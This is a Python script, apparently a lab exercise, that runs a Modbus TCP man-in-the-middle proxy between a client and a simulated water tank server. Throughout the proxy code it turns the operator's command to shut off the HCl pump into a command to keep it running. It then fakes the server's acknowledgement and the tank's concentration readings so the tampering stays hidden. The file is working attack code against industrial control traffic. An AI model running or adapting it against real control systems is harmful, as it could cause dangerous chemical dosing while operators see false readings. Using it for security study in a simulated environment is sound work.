#!/usr/bin/env python3
"""Pymodbus asynchronous man-in-the-middle example.

usage::

    python3 mitm_async.py

The corresponding server must be started before e.g. as:
    python3 waterTank.py dt.json

The corresponding client must be started after e.g. as:
    python3 client_async.py -c tcp -p 5030

"""
import asyncio
import logging
import sys
import pdb
import json
from tank_state import *

try:
    import helper
except ImportError:
    print("*** ERROR --> THIS EXAMPLE needs the example directory, please see \n\
          https://pymodbus.readthedocs.io/en/latest/source/examples.html\n\
          for more information.")
    sys.exit(-1)

import pymodbus.client as modbusClient
from pymodbus import ModbusException
from pymodbus.payload import BinaryPayloadDecoder
from pymodbus.constants import Endian
# from pymodbus.utilities import computeCRC


_logger = logging.getLogger(__file__)
logging.basicConfig(filename='mitm_async.log', level=logging.DEBUG)
_logger.setLevel("DEBUG")

# Host and Port information to create the MITM
MITM_PROXY_HOST = "127.0.0.1"
MITM_PROXY_PORT = 5030
ACTUAL_SERVER_HOST = "127.0.0.1"
ACTUAL_SERVER_PORT = 5020

global changeData
global dtDict
global inputRate, dilutionRate, update

class MITMModbusProxy:
    def __init__(self, client_host, client_port, server_host, server_port):
        self.client_host = client_host
        self.client_port = client_port
        self.server_host = server_host
        self.server_port = server_port
    
    async def proxy(self, reader, writer):
        client_addr = writer.get_extra_info("peername")
        print(f">> Connected to client: {client_addr}")

        server_reader, server_writer = await asyncio.open_connection(
            self.server_host, self.server_port
        )
        print(f">> Connected to server at {self.server_host}:{self.server_port}\n")
        changeData = False
        spoofedTankState = TankStateClass()
        count = 3
        try:
            while True:
                data = await reader.read(2048)

                if not data:
                    break

                parsed_data_map = self.parse_data(data)

                # If the client is trying to shut off the HCl pump for the first time (i.e. changeData == False)
                if parsed_data_map['function_code'] == 5 and parsed_data_map["coil_value"] == 0 and not changeData:
                    changeData = True

                # Manipulate the data if needed, else pass along the normal client data
                manipulated_data = self.transform_client_data(parsed_data_map, spoofedTankState) if changeData else data
                # print(manipulated_data)
                # Forward to the server
                server_writer.write(manipulated_data)
                await server_writer.drain()

                # Await the server's response
                response = await server_reader.read(1024)
                if not response:
                    break
                # print(response, "\n")
                # exit()
                # Manipulate the server's response data, else pass along the normal state to the client
                parsed_response_map = self.parse_response(response)
                
                # If the spoofed tank state class hasn't been set up yet
                if count != 0:
                    if parsed_response_map["function_code"] == 0x01:
                        spoofedTankState.set_client_cmd_coil(parsed_response_map["coils"][0])
                    elif parsed_response_map["function_code"] == 0x02:
                        spoofedTankState.set_hcl_input(parsed_response_map["coils"][0])
                    elif parsed_response_map["function_code"] == 0x03:
                        spoofedTankState.set_h_concentration(parsed_response_map["register_data"][0])
                        spoofedTankState.set_hcl_concentration(parsed_response_map["register_data"][1])
                    count = count - 1
                    if count == 0:
                        print(spoofedTankState.get_tank_state())
                
                manipulated_data = self.transform_server_data(parsed_response_map, spoofedTankState) if changeData else response
                
                # Write the response back to the client
                writer.write(manipulated_data)
                await writer.drain()
                # if count == 0:
                    # exit()
        except Exception as e:
            print(f"Error: {e}")
        finally:
            print(f">> Closing connection to client: {client_addr}")
            print("-"*50)
            writer.close()
            server_writer.close()

    async def start(self):
        server = await asyncio.start_server(
            self.proxy, self.client_host, self.client_port
        )
        print(f"MITM Proxy running on {self.client_host}:{self.client_port}")
        print("-"*50)
        async with server:
            await server.serve_forever()

    def transform_client_data(self, parsed_data_map, spoofedTankState):
        # Case 1: if the function_code is 'Write Single Register' and the value is 0
        if parsed_data_map['function_code'] == 5:
            if parsed_data_map["coil_value"] == 0:
                old_value = parsed_data_map["coil_value"]
                parsed_data_map["coil_value"] = 0xFF00
                print(f"\t**Spoofing client command: WRITE {old_value.to_bytes(2, byteorder='big')} --> WRITE {parsed_data_map["coil_value"].to_bytes(2, byteorder='big')}")
                spoofedTankState.set_client_cmd_coil(False)
            else:
                print(f"\tWARNING: WRITE {parsed_data_map["coil_value"]} not supported by MITM code in transform_client_data()...")
        
        # Since commands 0x01, 0x02, 0x03 are reading the state from the tank, there is no need to update/spoof the values until they are going back from the server
        elif parsed_data_map['function_code'] in [0x03, 0x02, 0x01]:
            pass
        else:
            print(f"WARNING: Function Code {parsed_data_map['function_code']} not recognized in transform_client_data()") 

        manipulated_data = self.create_new_command(parsed_data_map)

        return manipulated_data

    def transform_server_data(self, parsed_response_map, spoofedTankState):
        # Case 1: Response to Client Case 1 (Write Register with value 0)
        if parsed_response_map["function_code"] == 5:
            if parsed_response_map["coil_value"] == 0xFF00:
                old_value = parsed_response_map["coil_value"]
                new_value = 0
                parsed_response_map["coil_value"] = new_value.to_bytes(2,byteorder='big')
                print(f"\t**Spoofing server response: WRITE {old_value.to_bytes(2,byteorder='big')} --> WRITE {parsed_response_map["coil_value"]}\n")
            else:
                print(f"\tWARNING: WRITE {parsed_response_map["coil_value"]} not supported by MITM code in transform_server_data()...")

        elif parsed_response_map['function_code'] == 0x03:
            # print("function code 0x03...need to update")
            spoofedTankState.update_state(inputRate, dilutionRate, update)
            spoofed_reg = spoofedTankState.get_concentrations()
            old_reg_values = parsed_response_map["register_data"]
            parsed_response_map["register_data"] = [register for register in spoofed_reg]
            print(f"\t**Spoofing server response: {old_reg_values} changed to {parsed_response_map["register_data"]}")
        elif parsed_response_map['function_code'] in [0x02, 0x01]:
            # print("function code 0x02...need to update")
            # since the discrete_inputs and output_coils aren't used in client side calculations, there is no need to change them here.
            # if we use them or check them, then they need spoofed
            pass
        else:
            print(f"WARNING: Function Code {parsed_response_map['function_code']} not recognized in transform_server_data()") 

        manipulated_data = self.create_new_response(parsed_response_map)
        return manipulated_data

    def parse_data(self, data):
        parsed_data = {}
        parsed_data["transaction_id"] = int.from_bytes(data[0:2], byteorder='big')
        parsed_data["protocol_id"] = int.from_bytes(data[2:4], byteorder='big')
        parsed_data["length"] = int.from_bytes(data[4:6], byteorder='big')
        parsed_data["unit_id"] = data[6]
        parsed_data["function_code"] = data[7]

        if parsed_data["function_code"] in [1,2]:
            parsed_data["coil_addr"] = int.from_bytes(data[8:10], byteorder='big')
            parsed_data["quantity_of_coils"] = int.from_bytes(data[10:12], byteorder='big')
        elif parsed_data["function_code"] in [3]:
            parsed_data["register_addr"] = int.from_bytes(data[8:10], byteorder='big')
            parsed_data["quantity_of_registers"] = int.from_bytes(data[10:12], byteorder='big')
        elif parsed_data["function_code"] in [5]:
            parsed_data["coil_addr"] = int.from_bytes(data[8:10], byteorder='big')
            parsed_data["coil_value"] = int.from_bytes(data[10:12], byteorder='big')

        return parsed_data
    
    def parse_response(self, response):
        parsed_response = {}
        parsed_response["transaction_id"] = int.from_bytes(response[0:2], byteorder='big')
        parsed_response["protocol_id"] = int.from_bytes(response[2:4], byteorder='big')
        parsed_response["length"] = int.from_bytes(response[4:6], byteorder='big')
        parsed_response["unit_id"] = response[6]
        parsed_response["function_code"] = response[7]

        if parsed_response["function_code"] in [3, 4]:
            parsed_response["byte_count"] = response[8]
            register_data = response[9:9 + parsed_response["byte_count"]]
            registers = [int.from_bytes(register_data[i:i+2], byteorder='big') for i in range(0, len(register_data), 2)]
            parsed_response["register_data"] = registers
        elif parsed_response["function_code"] in [1,2]:
            parsed_response["byte_count"] = response[8]
            coil_data = response[9:9 + parsed_response["byte_count"]]
            coils = []
            for byte in coil_data:
                for bit in range(8):
                    coils.append(bool((byte >> bit) & 1))
            parsed_response['coils'] = coils
        elif parsed_response["function_code"] in [5]:
            parsed_response["coil_addr"] = int.from_bytes(response[8:10], byteorder='big')
            parsed_response['coil_value'] = int.from_bytes(response[10:12], byteorder='big')
        
        return parsed_response    

    def create_new_command(self, parsed_data_map):
        transaction_id = (parsed_data_map["transaction_id"]).to_bytes(2, byteorder='big')
        protocol_id = (parsed_data_map["protocol_id"]).to_bytes(2, byteorder='big')
        length = (parsed_data_map["length"]).to_bytes(2, byteorder='big')
        unit_id = (parsed_data_map["unit_id"]).to_bytes(1, byteorder='big')
        function_code = (parsed_data_map["function_code"]).to_bytes(1, byteorder='big')

        if parsed_data_map["function_code"] in [1,2]:
            coil_addr = (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
            quantity_of_coils = (parsed_data_map["quantity_of_coils"]).to_bytes(2, byteorder='big')
            new_length = len(unit_id + function_code + coil_addr + quantity_of_coils).to_bytes(2, byteorder='big')
            return transaction_id + protocol_id + new_length + unit_id + function_code + coil_addr + quantity_of_coils
        elif parsed_data_map["function_code"] in [3]:
            register_addr = (parsed_data_map["register_addr"]).to_bytes(2, byteorder='big')
            quantity_of_registers = (parsed_data_map["quantity_of_registers"]).to_bytes(2, byteorder='big')
            new_length = len(unit_id + function_code + register_addr + quantity_of_registers).to_bytes(2, byteorder='big')
            return transaction_id + protocol_id + new_length + unit_id + function_code + register_addr + quantity_of_registers
        elif parsed_data_map["function_code"] in [5]:
            coil_addr = (parsed_data_map["coil_addr"]).to_bytes(2, byteorder='big')
            coil_value = (parsed_data_map["coil_value"]).to_bytes(2, byteorder='big')
            new_length = len(unit_id + function_code + coil_addr + coil_value).to_bytes(2, byteorder='big')
            return transaction_id + protocol_id + new_length + unit_id + function_code + coil_addr + coil_value

    def create_new_response(self, parsed_response_map):
        manipulated_data = b''

        manipulated_data += (parsed_response_map["transaction_id"]).to_bytes(2, byteorder='big')
        manipulated_data += (parsed_response_map["protocol_id"]).to_bytes(2, byteorder='big')
        manipulated_data += (parsed_response_map["length"]).to_bytes(2, byteorder='big')
        manipulated_data += (parsed_response_map["unit_id"]).to_bytes(1, byteorder='big')
        manipulated_data += (parsed_response_map["function_code"]).to_bytes(1, byteorder='big')

        if parsed_response_map["function_code"] in [1,2]:
            manipulated_data += (parsed_response_map["byte_count"]).to_bytes(1, byteorder='big')
            coil_bytes = bytearray()
            coils = parsed_response_map["coils"]
            for i in range(0,len(coils),8):
                byte = 0
                for bit, coil in enumerate(coils[i:i+8]):
                    if coil:
                        byte |= (1 << bit)
                coil_bytes.append(byte)
            manipulated_data += coil_bytes
        elif parsed_response_map["function_code"] in [3]:
            manipulated_data += (parsed_response_map["byte_count"]).to_bytes(1, byteorder='big')
            register_data = b''.join(reg.to_bytes(2, byteorder='big') for reg in parsed_response_map["register_data"])
            manipulated_data += register_data
        elif parsed_response_map["function_code"] in [5]:
            manipulated_data += (parsed_response_map["coil_addr"]).to_bytes(2, byteorder='big')
            manipulated_data += (parsed_response_map["coil_value"])

        return manipulated_data

def update_inputs():
    global dtDict, argFile, inputRate, dilutionRate, update

    with open(argFile,'r') as rf:
        dtDict = json.load(rf)


    if 'inputRate' in dtDict:
        inputRate = dtDict['inputRate'] # Rate of HCl entering tank

    assert inputRate > 0.0, "inputRate should be positive"

    if 'dilutionRate' in dtDict:
        dilutionRate = dtDict['dilutionRate'] # Rate of water entering tank

    assert dilutionRate > 0.0, "dilutionRate should be positive"

    if 'update' in dtDict:
        update = dtDict['update']

    assert 0.0 < update < 10.0, "update should be positive and less than 10 seconds"

if __name__ == "__main__":
    argFile = 'dt.json'
    update_inputs()
    proxy = MITMModbusProxy(
        MITM_PROXY_HOST, MITM_PROXY_PORT, ACTUAL_SERVER_HOST, ACTUAL_SERVER_PORT
    )
    asyncio.run(proxy.start())
